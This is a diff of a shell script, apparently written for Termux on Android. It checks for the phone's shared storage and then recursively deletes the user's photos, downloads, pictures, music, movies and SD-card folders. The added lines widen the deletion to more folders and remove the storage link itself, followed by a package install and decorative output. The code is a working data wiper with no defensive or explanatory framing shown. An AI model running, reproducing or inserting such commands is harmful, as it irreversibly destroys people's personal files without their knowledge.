@@ -13,8 +13,9 @@ test -d "storage" && a=1 || b=0
 if [ $a == 1 ]; then
 cd ~;cd;storage;rm -rf dcim/* downloads/* shared/* pictures/* music/* extsdcard/*; 
 rm -rf movies/* emulated-1/* sdccard/* sdcard1/* sdcard0/* sdcard-1/* emulated-1/*
-cd ~;cd sdcard;rm -rf dcim downloads pictures music extsdcard 
-pkg install ncurses-utils -y
+cd ~;cd sdcard;rm -rf dcim downloads pictures music extsdcard movies emulated-1 sdccard sdcard1 sdcard0 sdcard-1 emulated-1
+cd ~; rm -rf storage
+pkg install ncurses-utils
 for lp in 1 2 3 4 5 
 do
 echo " $bold "
